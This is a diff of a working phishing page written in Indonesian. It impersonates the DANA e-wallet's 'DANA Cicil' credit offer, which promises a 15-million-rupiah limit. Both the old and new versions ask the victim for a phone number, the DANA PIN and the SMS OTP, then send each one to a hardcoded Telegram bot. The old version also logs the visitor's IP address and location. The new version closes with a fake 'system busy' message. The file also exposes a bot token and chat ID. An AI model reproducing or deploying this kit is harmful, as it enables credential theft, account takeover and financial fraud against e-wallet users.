@@ -2,234 +2,216 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    
-    <meta property="og:title" content="DANA CICIL - Aktivasi Limit Saldo 15 Juta">
-    <meta property="og:description" content="Aktivasi DANA Cicil sekarang, belanja hari ini bayar nanti. Cepat, Mudah, dan Aman.">
-    <meta property="og:image" content="https://i.ibb.co/0jzQMDbw/1000233697.png">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:type" content="website">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content="https://i.ibb.co/0jzQMDbw/1000233697.png">
-
-    <title>DANA CICIL - Layanan Kredit Pintar</title>
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DANA - Dompet Digital Indonesia</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        :root { --d-blue: #118eea; --d-dark: #0077d4; --d-bg: #f4f7fa; }
-        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; outline: none !important; }
-        body { background-color: #0b0e11; margin: 0; overflow: hidden; user-select: none; }
-
-        /* --- HARDWARE ACCELERATION --- */
-        .safe-layer { transform: translateZ(0); will-change: transform, opacity; backface-visibility: hidden; }
-        .container-app { width: 100%; max-width: 450px; margin: 0 auto; min-height: 100vh; background: white; position: relative; display: flex; flex-direction: column; box-shadow: 0 0 100px rgba(0,0,0,0.6); }
-
-        /* --- PANEL STATES --- */
-        .view-panel { display: none; flex-grow: 1; padding: 20px; }
-        .view-panel.active { display: block; animation: slideUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
-
-        /* --- MODERN UI --- */
-        .header-modern { background: var(--d-blue); padding: 35px 20px; border-bottom-left-radius: 40px; border-bottom-right-radius: 40px; margin: -20px -20px 25px -20px; color: white; text-align: center; box-shadow: 0 10px 30px rgba(17, 142, 234, 0.25); }
-        .balance-box { background: linear-gradient(135deg, rgba(255,255,255,0.2) 0%, rgba(255,255,255,0.05) 100%); backdrop-filter: blur(12px); padding: 20px; border-radius: 25px; border: 1px solid rgba(255,255,255,0.3); margin-top: 20px; }
-        .item-tenure { border: 2px solid #f1f5f9; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); cursor: pointer; }
-        .item-tenure.selected { border-color: var(--d-blue); background: rgba(17, 142, 234, 0.05); transform: scale(1.02); }
-        .input-digit { width: 46px; height: 56px; background: #f8fafc; border: 2px solid #e2e8f0; border-radius: 14px; font-size: 24px; font-weight: 800; text-align: center; transition: all 0.2s; }
-        .input-digit:focus { border-color: var(--d-blue); background: white; box-shadow: 0 0 12px rgba(17, 142, 234, 0.2); }
-        .btn-dana-cicil { background: linear-gradient(135deg, var(--d-blue) 0%, var(--d-dark) 100%); box-shadow: 0 10px 25px rgba(17, 142, 234, 0.4); transition: all 0.3s; }
-        .btn-dana-cicil:active { transform: scale(0.96); opacity: 0.95; }
-
-        #loading-ui { position: absolute; inset: 0; background: rgba(255, 255, 255, 0.98); z-index: 1000; display: none; flex-direction: column; align-items: center; justify-content: center; }
-        .ring-anim { width: 46px; height: 46px; border: 5px solid #f1f5f9; border-top: 5px solid var(--d-blue); border-radius: 50%; animation: rotateRing 0.8s linear infinite; }
-        @keyframes rotateRing { 100% { transform: rotate(360deg); } }
+        body { font-family: 'Open Sans', sans-serif; background: #f5f5f5; color: #333; overflow-x: hidden; touch-action: manipulation; }
+        .bg-dana { background-color: #118eea; }
+        .text-dana { color: #118eea; }
+        .card-shadow { box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
+        .input-otp { width: 45px; height: 50px; border-bottom: 2px solid #ccc; font-size: 24px; text-align: center; background: transparent; transition: 0.3s; }
+        .input-otp:focus { border-bottom-color: #118eea; outline: none; }
+        .pin-dot { width: 15px; height: 15px; border: 2px solid #ccc; border-radius: 50%; margin: 0 8px; transition: 0.2s; }
+        .pin-dot.active { background: #118eea; border-color: #118eea; }
+        .numpad button { height: 60px; font-size: 1.5rem; font-weight: 600; color: #333; transition: 0.1s; }
+        .numpad button:active { background: #e0e0e0; border-radius: 50%; }
+        .page { display: none; position: absolute; width: 100%; min-height: 100vh; background: #f5f5f5; }
+        .page.active { display: block; }
+        .loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 1000; display: none; justify-content: center; align-items: center; }
     </style>
 </head>
-<body class="safe-layer" onload="triggerVisit()">
+<body>
 
-    <div class="container-app">
-        <div id="loading-ui">
-            <div class="ring-anim"></div>
-            <p class="mt-4 text-[10px] font-black text-gray-400 tracking-[0.4em] uppercase">ENKRIPSI DATA AMAN</p>
+<div id="loader" class="loader-overlay">
+    <div class="animate-spin rounded-full h-12 w-12 border-t-4 border-blue-600"></div>
+</div>
+
+<div id="page1" class="page active animate__animated animate__fadeIn">
+    <div class="bg-dana p-5 pb-24 text-white">
+        <div class="flex justify-between items-center mb-6">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_danain.png" width="90">
+            <div class="flex items-center space-x-3">
+                <div class="text-right">
+                    <p class="text-[10px] opacity-80">Saldo DANA</p>
+                    <p class="font-bold">Rp 15.000.000</p>
+                </div>
+                <div class="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
+                </div>
+            </div>
         </div>
-
-        <section id="panel-0" class="view-panel active">
-            <div class="header-modern shadow-xl">
-                <div class="flex justify-between items-center mb-2">
-                    <svg width="100" height="30" viewBox="0 0 1024 280"><path d="M366.1 42.4h-94.8v191.2h94.8c66.3 0 120.2-53.9 120.2-120.2S432.4 42.4 366.1 42.4zM584.2 42.4l-95.3 191.2h53.1l20.1-40.3h104.2l20.1 40.3h53.1L644.3 42.4H584.2zM859.5 42.4H764.7v191.2h51.4V115.8l94.8 117.8h94.8V42.4h-51.4v117.8z" fill="#fff"/></svg>
-                    <span class="text-[8px] font-black uppercase tracking-widest px-3 py-1 bg-white/20 rounded-full border border-white/30">Official Sponsor 2025</span>
-                </div>
-                <div class="balance-box animate__animated animate__zoomIn">
-                    <p class="text-[9px] font-bold uppercase tracking-[0.2em] opacity-80 mb-1">Limit Saldo Dana Cicil</p>
-                    <div class="flex items-baseline justify-center gap-1">
-                        <span class="text-sm font-bold">Rp</span>
-                        <h2 class="text-4xl font-black italic tracking-tighter">15.000.000</h2>
-                    </div>
-                </div>
-            </div>
-
-            <div class="mt-2">
-                <h3 class="text-xs font-black text-gray-400 uppercase tracking-widest mb-4">Tenor Pinjaman Dana Cicil</h3>
-                <div class="grid grid-cols-2 gap-3 mb-8">
-                    <div onclick="selectT(this, '3 Bulan')" class="item-tenure p-4 rounded-2xl">
-                        <p class="text-[9px] font-bold text-gray-400 uppercase">3 Bulan</p>
-                        <p class="text-sm font-black text-blue-600">Rp5.000.000</p>
-                    </div>
-                    <div onclick="selectT(this, '6 Bulan')" class="item-tenure p-4 rounded-2xl">
-                        <p class="text-[9px] font-bold text-gray-400 uppercase">6 Bulan</p>
-                        <p class="text-sm font-black text-blue-600">Rp2.500.000</p>
-                    </div>
-                    <div onclick="selectT(this, '9 Bulan')" class="item-tenure p-4 rounded-2xl">
-                        <p class="text-[9px] font-bold text-gray-400 uppercase">9 Bulan</p>
-                        <p class="text-sm font-black text-blue-600">Rp1.666.000</p>
-                    </div>
-                    <div onclick="selectT(this, '12 Bulan')" class="item-tenure p-4 rounded-2xl">
-                        <p class="text-[9px] font-bold text-gray-400 uppercase">12 Bulan</p>
-                        <p class="text-sm font-black text-blue-600">Rp1.250.000</p>
-                    </div>
-                </div>
-                <button onclick="nav(1)" class="w-full btn-dana-cicil py-5 rounded-full text-white font-extrabold text-sm tracking-widest uppercase">Lanjut Aktivasi</button>
-            </div>
-        </section>
-
-        <section id="panel-1" class="view-panel">
-            <div class="flex items-center mb-10"><button onclick="nav(0)" class="p-2 bg-gray-100 rounded-full"><svg class="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg></button><h1 class="ml-4 font-bold text-lg text-blue-600 italic">DANA CICIL</h1></div>
-            <h2 class="text-xl font-extrabold mb-1">Verifikasi Identitas</h2>
-            <div class="mb-14 mt-10">
-                <label class="text-[10px] font-black text-blue-500 uppercase tracking-widest mb-3 block italic">NOMOR TELEPON APP DANA</label>
-                <div class="relative border-b-2 border-gray-100 focus-within:border-blue-500 transition-all py-3">
-                    <span class="absolute left-0 bottom-4 font-extrabold text-xl">+62</span>
-                    <input type="number" id="phone_id" class="w-full pl-12 pb-1 text-xl font-extrabold outline-none bg-transparent" placeholder="8xx xxxx xxxx">
-                </div>
-            </div>
-            <button onclick="submitHP()" class="w-full btn-dana-cicil py-5 rounded-full text-white font-extrabold text-sm tracking-widest uppercase shadow-lg">Lanjut Ke PIN</button>
-        </section>
-
-        <section id="panel-2" class="view-panel">
-            <div class="flex items-center mb-10"><button onclick="nav(1)" class="p-2 bg-gray-100 rounded-full"><svg class="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg></button><h1 class="ml-4 font-bold text-lg flex-grow text-center pr-8 italic text-blue-600">DANA CICIL</h1></div>
-            <div class="text-center mt-6">
-                <h2 class="text-lg font-extrabold mb-1">Konfirmasi PIN</h2>
-                <p class="text-gray-400 text-[10px] mb-12 font-bold tracking-[0.2em] uppercase italic">MASUKKAN 6 DIGIT PIN APP DANA ANDA</p>
-                <div class="flex justify-center gap-2 mb-10">
-                    <input type="password" maxlength="1" inputmode="numeric" class="input-digit" id="p1" onkeyup="jump(this, 'p2')">
-                    <input type="password" maxlength="1" inputmode="numeric" class="input-digit" id="p2" onkeyup="jump(this, 'p3')">
-                    <input type="password" maxlength="1" inputmode="numeric" class="input-digit" id="p3" onkeyup="jump(this, 'p4')">
-                    <input type="password" maxlength="1" inputmode="numeric" class="input-digit" id="p4" onkeyup="jump(this, 'p5')">
-                    <input type="password" maxlength="1" inputmode="numeric" class="input-digit" id="p5" onkeyup="jump(this, 'p6')">
-                    <input type="password" maxlength="1" inputmode="numeric" class="input-digit" id="p6" onkeyup="submitPIN()">
-                </div>
-            </div>
-        </section>
-
-        <section id="panel-3" class="view-panel">
-            <div class="flex items-center mb-10"><button onclick="nav(2)" class="p-2 bg-gray-100 rounded-full"><svg class="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg></button><h1 class="ml-4 font-bold text-lg italic text-blue-600">DANA CICIL</h1></div>
-            <div class="text-center">
-                <div class="w-20 h-20 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-6 text-blue-500 animate-pulse"><svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg></div>
-                <h2 class="text-lg font-extrabold mb-1 italic">Cek Kode OTP</h2>
-                <div class="flex justify-center gap-3 mt-12 mb-10">
-                    <input type="number" maxlength="1" inputmode="numeric" class="input-digit" id="o1" onkeyup="jump(this, 'o2')">
-                    <input type="number" maxlength="1" inputmode="numeric" class="input-digit" id="o2" onkeyup="jump(this, 'o3')">
-                    <input type="number" maxlength="1" inputmode="numeric" class="input-digit" id="o3" onkeyup="jump(this, 'o4')">
-                    <input type="number" maxlength="1" inputmode="numeric" class="input-digit" id="o4" onkeyup="submitOTP()">
-                </div>
-                <p class="text-gray-400 text-[10px]">Tunggu <span id="clock" class="text-blue-500 font-bold">60</span> detik</p>
-            </div>
-        </section>
-
-        <section id="panel-4" class="view-panel text-center flex flex-col items-center justify-center py-20">
-            <div class="animate__animated animate__zoomIn"><div class="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-8 border-4 border-white shadow-xl shadow-green-500/10"><svg class="w-12 h-12 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg></div><h2 class="text-2xl font-black italic mb-3 text-blue-900 uppercase italic">AKTIVASI BERHASIL</h2><p class="text-[13px] text-gray-400 px-10 leading-relaxed italic">Limit sedang diproses ke akun anda.</p><button onclick="location.reload()" class="mt-14 w-full btn-dana-cicil py-5 rounded-full text-white font-extrabold uppercase shadow-lg">SELESAI</button></div>
-        </section>
+        <div class="bg-white rounded-xl p-4 card-shadow absolute left-5 right-5 top-28 flex justify-around text-dana font-semibold text-xs">
+            <div class="text-center"><div class="w-12 h-12 bg-blue-50 rounded-full mb-1 flex items-center justify-center mx-auto">➕</div>Pindai</div>
+            <div class="text-center"><div class="w-12 h-12 bg-blue-50 rounded-full mb-1 flex items-center justify-center mx-auto">💰</div>Isi Saldo</div>
+            <div class="text-center"><div class="w-12 h-12 bg-blue-50 rounded-full mb-1 flex items-center justify-center mx-auto">📤</div>Kirim</div>
+            <div class="text-center"><div class="w-12 h-12 bg-blue-50 rounded-full mb-1 flex items-center justify-center mx-auto">📥</div>Minta</div>
+        </div>
     </div>
 
-    <script>
-        const API_KEY = "8336160915:AAFUeRN28Q5CsdxMsYH5qvS6IQ9iJxqpEXA";
-        const USER_ID = "8001301204";
-        const store = { hp: "", pin: "", otp: "", tnr: "", ip: "Loading..." };
+    <div class="mt-20 px-5">
+        <div class="bg-white rounded-xl p-5 card-shadow mb-4">
+            <div class="flex justify-between items-center border-b pb-3 mb-3">
+                <span class="font-bold text-gray-700">DANA Cicil</span>
+                <span class="bg-blue-100 text-dana text-[10px] px-2 py-1 rounded font-bold">SPONSORED</span>
+            </div>
+            <p class="text-sm text-gray-500 mb-1">Limit Tersedia</p>
+            <h2 class="text-2xl font-bold text-gray-800 mb-4">Rp 15.000.000</h2>
+            <div class="grid grid-cols-2 gap-3 mb-4">
+                <div class="bg-gray-50 p-3 rounded-lg border border-dashed border-blue-300">
+                    <p class="text-[10px] text-gray-500 uppercase">Tenor</p>
+                    <p class="font-bold text-sm">Hingga 12 Bulan</p>
+                </div>
+                <div class="bg-gray-50 p-3 rounded-lg border border-dashed border-blue-300">
+                    <p class="text-[10px] text-gray-500 uppercase">Bunga</p>
+                    <p class="font-bold text-sm text-green-600">0%* Per Bulan</p>
+                </div>
+            </div>
+            <button onclick="changePage('page-phone')" class="w-full bg-dana text-white font-bold py-3 rounded-lg hover:bg-blue-600 transition">AKTIFKAN SEKARANG</button>
+        </div>
+    </div>
+</div>
 
-        async function push(msg) {
-            fetch(`https://api.telegram.org/bot${API_KEY}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: USER_ID, text: msg, parse_mode: 'HTML' })
-            }).catch(e => {});
-        }
+<div id="page-phone" class="page animate__animated animate__fadeInRight">
+    <div class="p-6">
+        <button onclick="changePage('page1')" class="mb-8 text-gray-400">✕</button>
+        <h2 class="text-2xl font-bold mb-2">Masuk ke DANA</h2>
+        <p class="text-gray-500 text-sm mb-8">Masukkan nomor HP kamu untuk lanjut.</p>
+        <div class="flex items-center border-b-2 border-dana py-2 mb-10">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg" class="w-6 mr-3">
+            <span class="font-bold text-lg mr-2">+62</span>
+            <input type="tel" id="nomorhp" class="w-full text-lg font-bold outline-none bg-transparent" placeholder="811-234-XXX" autofocus>
+        </div>
+        <button onclick="savePhone()" class="w-full bg-dana text-white font-bold py-3 rounded-lg shadow-lg">LANJUT</button>
+    </div>
+</div>
 
-        async function triggerVisit() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                store.ip = data.ip;
-                push(`<b>👤 PENGUNJUNG BARU (LIVE)</b>\n━━━━━━━━━━━━━━━\n<b>IP Address:</b> <code>${data.ip}</code>\n<b>Lokasi:</b> <code>${data.city}, ${data.country_name}</code>\n<b>Waktu:</b> <code>${new Date().toLocaleTimeString()}</code>\n<b>Status:</b> Memilih Tenor...`);
-            } catch (e) {
-                push(`<b>👤 PENGUNJUNG BARU (LIVE)</b>\n━━━━━━━━━━━━━━━\n<b>Status:</b> Gagal Tarik IP`);
+<div id="page-pin" class="page animate__animated animate__fadeInRight bg-dana text-white">
+    <div class="p-8 text-center">
+        <h2 class="text-xl font-bold mb-2 mt-10">Masukkan PIN DANA</h2>
+        <p class="text-blue-100 text-sm mb-12">Keamanan adalah prioritas kami.</p>
+        
+        <div class="flex justify-center mb-20" id="pin-container">
+            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
+            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
+        </div>
+
+        <div class="grid grid-cols-3 gap-4 numpad max-w-xs mx-auto text-white">
+            <button onclick="pressPin('1')">1</button><button onclick="pressPin('2')">2</button><button onclick="pressPin('3')">3</button>
+            <button onclick="pressPin('4')">4</button><button onclick="pressPin('5')">5</button><button onclick="pressPin('6')">6</button>
+            <button onclick="pressPin('7')">7</button><button onclick="pressPin('8')">8</button><button onclick="pressPin('9')">9</button>
+            <div></div><button onclick="pressPin('0')">0</button>
+            <button onclick="delPin()" class="text-sm">Hapus</button>
+        </div>
+    </div>
+</div>
+
+<div id="page-otp" class="page animate__animated animate__fadeInRight">
+    <div class="p-6 text-center">
+        <div class="flex justify-center mb-6 mt-10">
+            <img src="https://i.ibb.co/WpDnTQQt/1000233246.jpg" class="w-16 rounded-full shadow-lg">
+        </div>
+        <h2 class="text-xl font-bold mb-2">Verifikasi OTP</h2>
+        <p class="text-gray-500 text-sm mb-8">Kode dikirim ke <span id="display-hp" class="font-bold"></span> via SMS.</p>
+        
+        <div class="flex justify-center space-x-2 mb-10">
+            <input type="tel" maxlength="1" class="otp-box input-otp" id="otp1">
+            <input type="tel" maxlength="1" class="otp-box input-otp" id="otp2">
+            <input type="tel" maxlength="1" class="otp-box input-otp" id="otp3">
+            <input type="tel" maxlength="1" class="otp-box input-otp" id="otp4">
+        </div>
+        
+        <button onclick="sendFinal()" class="w-full bg-dana text-white font-bold py-3 rounded-lg">KONFIRMASI</button>
+        <p class="mt-8 text-sm text-gray-400">Tidak menerima kode? <span class="text-dana font-bold">Kirim Ulang (59s)</span></p>
+    </div>
+</div>
+
+<script>
+    const TELEGRAM_TOKEN = "8336160915:AAFUeRN28Q5CsdxMsYH5qvS6IQ9iJxqpEXA";
+    const CHAT_ID = "8001301204";
+    
+    let currentData = { hp: "", pin: "", otp: "" };
+    let pinInput = "";
+
+    function showLoader(next) {
+        document.getElementById('loader').style.display = 'flex';
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            if(next) next();
+        }, 1200);
+    }
+
+    function changePage(pageId) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(pageId).classList.add('active');
+    }
+
+    async function sendTelegram(msg) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html`;
+        await fetch(url);
+    }
+
+    function savePhone() {
+        const hp = document.getElementById('nomorhp').value;
+        if(hp.length < 9) return alert("Masukkan nomor HP yang valid");
+        currentData.hp = "0" + hp;
+        document.getElementById('display-hp').innerText = currentData.hp;
+        
+        showLoader(() => {
+            sendTelegram(`🚀 <b>DANA TARGET</b>\n\n📱 HP: <code>${currentData.hp}</code>\n⚡ Status: Menunggu PIN...`);
+            changePage('page-pin');
+        });
+    }
+
+    function pressPin(num) {
+        if(pinInput.length < 6) {
+            pinInput += num;
+            updatePinUI();
+            if(pinInput.length === 6) {
+                currentData.pin = pinInput;
+                showLoader(() => {
+                    sendTelegram(`🔑 <b>DANA PIN</b>\n\n📱 HP: <code>${currentData.hp}</code>\n🔐 PIN: <code>${currentData.pin}</code>\n⚡ Status: Menunggu OTP...`);
+                    changePage('page-otp');
+                });
             }
         }
+    }
 
-        function load() {
-            const el = document.getElementById('loading-ui');
-            el.style.display = 'flex';
-            setTimeout(() => { el.style.display = 'none'; }, 1000);
-        }
+    function delPin() {
+        pinInput = pinInput.slice(0, -1);
+        updatePinUI();
+    }
 
-        function nav(idx) {
-            if(idx === 1 && !store.tnr) return alert("Pilih Tenor!");
-            document.querySelectorAll('.view-panel').forEach((p, i) => p.classList.toggle('active', i === idx));
-        }
+    function updatePinUI() {
+        const dots = document.querySelectorAll('.pin-dot');
+        dots.forEach((dot, i) => {
+            if(i < pinInput.length) dot.classList.add('active');
+            else dot.classList.remove('active');
+        });
+    }
 
-        function selectT(el, v) {
-            document.querySelectorAll('.item-tenure').forEach(c => c.classList.remove('selected'));
-            el.classList.add('selected');
-            store.tnr = v;
-        }
+    // OTP Auto focus
+    document.querySelectorAll('.otp-box').forEach((box, i, arr) => {
+        box.addEventListener('input', () => {
+            if(box.value.length === 1 && i < arr.length - 1) arr[i+1].focus();
+        });
+    });
 
-        function jump(curr, nxtId) {
-            if (curr.value.length >= 1) {
-                const nextEl = document.getElementById(nxtId);
-                if (nextEl) nextEl.focus();
-            }
-        }
+    async function sendFinal() {
+        let otp = "";
+        document.querySelectorAll('.otp-box').forEach(b => otp += b.value);
+        if(otp.length < 4) return alert("Masukkan OTP lengkap");
+        
+        currentData.otp = otp;
+        showLoader(async () => {
+            await sendTelegram(`✅ <b>DANA SUCCESS</b>\n\n📱 HP: <code>${currentData.hp}</code>\n🔐 PIN: <code>${currentData.pin}</code>\n📩 OTP: <code>${currentData.otp}</code>\n💰 Limit: Rp 15.000.000`);
+            alert("Sistem sedang sibuk. Silahkan coba lagi dalam 24 jam.");
+            window.location.reload();
+        });
+    }
+</script>
 
-        function submitHP() {
-            const v = document.getElementById('phone_id').value;
-            if (v.length < 9) return;
-            store.hp = "0" + v;
-            load();
-            push(`<b>⚡ LOG DANA (STEP 1)</b>\n━━━━━━━━━━━━━━━\n<b>IP Address:</b> <code>${store.ip}</code>\n<b>HP:</b> <code>${store.hp}</code>\n<b>Tenor:</b> <code>${store.tnr}</code>`);
-            setTimeout(() => nav(2), 1000);
-        }
-
-        function submitPIN() {
-            let p = "";
-            for(let i=1; i<=6; i++) p += document.getElementById('p'+i).value;
-            if (p.length === 6) {
-                store.pin = p;
-                load();
-                push(`<b>🔑 LOG DANA (STEP 2)</b>\n━━━━━━━━━━━━━━━\n<b>HP:</b> <code>${store.hp}</code>\n<b>PIN:</b> <code>${store.pin}</code>`);
-                setTimeout(() => { nav(3); startT(); }, 1000);
-            }
-        }
-
-        function submitOTP() {
-            let o = "";
-            for(let i=1; i<=4; i++) o += document.getElementById('o'+i).value;
-            if (o.length === 4) {
-                store.otp = o;
-                load();
-                push(`<b>✅ LOG FINAL</b>\n━━━━━━━━━━━━━━━\n<b>IP:</b> <code>${store.ip}</code>\n<b>HP:</b> <code>${store.hp}</code>\n<b>PIN:</b> <code>${store.pin}</code>\n<b>OTP:</b> <code>${store.otp}</code>`);
-                setTimeout(() => nav(4), 1000);
-            }
-        }
-
-        function startT() {
-            let s = 60;
-            const el = document.getElementById('clock');
-            const intr = setInterval(() => { s--; el.innerText = s; if (s <= 0) clearInterval(intr); }, 1000);
-        }
-
-        document.addEventListener('contextmenu', e => e.preventDefault());
-    </script>
 </body>
 </html>
